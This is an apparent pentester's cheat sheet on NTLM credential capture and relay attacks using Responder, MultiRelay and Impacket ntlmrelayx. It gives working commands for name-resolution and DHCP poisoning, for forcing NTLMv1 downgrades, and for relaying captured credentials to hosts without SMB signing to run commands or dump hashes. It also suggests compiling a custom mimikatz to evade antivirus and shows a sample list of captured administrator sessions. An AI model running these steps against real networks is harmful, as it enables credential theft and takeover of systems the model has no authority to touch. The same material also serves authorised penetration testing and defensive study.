#enumeration #relay-enumeration
# Source: 

https://github.com/lgandx/Responder

# Tools in Responder: 

Location: /usr/share/Responder/tools

# Make changes to config to turn off services:

`nano /usr/share/responder/Responder.conf`

# Configuring MultiRelay: 
In Kali Linux: 
1. pip install pycryptodome
2. Install Mingw and create multi relay binaries:
```
sudo apt-get install gcc-mingw-w64-x86-64
sudo x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv
sudo x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
```
4. python3 MultiRelay.py
```
Usage: 
responder-MultiRelay -t 10.20.30.40 -u Administrator lgandx admin
responder-MultiRelay -t 10.20.30.40 -u ALL

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -t 10.20.30.45        Target server for SMB relay.
  -p 8081               Additional port to listen on, this will relay for
                        proxy, http and webdav incoming packets.
  -u, --UserToRelay     Users to relay. Use '-u ALL' to relay all users.
  -c whoami, --command=whoami
                        Single command to run (scripting)
  -d, --dump            Dump hashes (scripting)
```


# Starting Responder:

- responder -I [Interface] -A
- responder -I [Interface] -i [IP Address] or -e [External IP] -A

## Starting Responder in Basic Authentication Mode
- responder -I [Interface] -wdF -b

## Force NTLM Authentication to version 1 instead of version 2:
- responder -I [Interface] -wdF --lm --disable-ess

## External IP Poisoning
- responder -I [Interface] -e 172.21.1.2

## DNS Injection in DHCP Responses
- responder -i [interface] -D

# Using Responder-RunFinger to verify if SMB Signing is not enabled

- responder-RunFinger -i 172.21.0.0/24
- python3 RunFinger.py -i 172.21.0.0/24

# Using Responder-MultiRelay
Tips:
Multirelay uses the default version of mimikatz and it can easily flagged by AV. It is recommend to compile your own custom version and use it with mutlirelay.
Do not run multirelay against targets that have smb message_signing enabled:

- responder-Multirelay -t 172.21.0.0 - u ALL
- python3 Multirelay.py -t 172.21.0.0 -u ALL

# Using Responder with Impacket-Ntlmrelayx
NtlmRelayX is an impacket script that allows you to conduct NTLM Relay Attacks, by creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).

1. When you are using responder to capture challenges and relay them to ntlmrelayx you will need to turn off HTTP and SMB in the responder.conf file. Also have a list of what systems are running smb and have smb signing disabled.

2. Set up a socks proxy on port 1080. This socks proxy will successfully relay the traffic to ntlmrelayx. 
- sudo nano /etc/proxychains4.conf
```
[ProxyList]
# NtlmRelayX Socks Proxy
socks4 127.0.0.1 1080
# Other Proxies
```
3. Run Responder and NtlmRelayX to watch the magic happen:
- sudo Responder -I [Interface]
- impacket-ntlmrelayx -socks -smb2support -tf smb-targets.txt
- ntlmrelayx.py -socks -smb2support -tf smb-targets.txt

To view a full list of captured sessions from NtlmRelayX
```
ntlmrelayx> socks
Protocol  Target          Username                  Port
--------  --------------  ------------------------  ----
SMB       172.21.48.38   SPAWN/MSIMMONS            445
SMB       172.21.48.230  FAERIE/ADMINISTRATOR      445
SMB       172.21.48.230  FAERIE/ALSIMMONS          445
```

# References: 

- https://github.com/lgandx/Responder


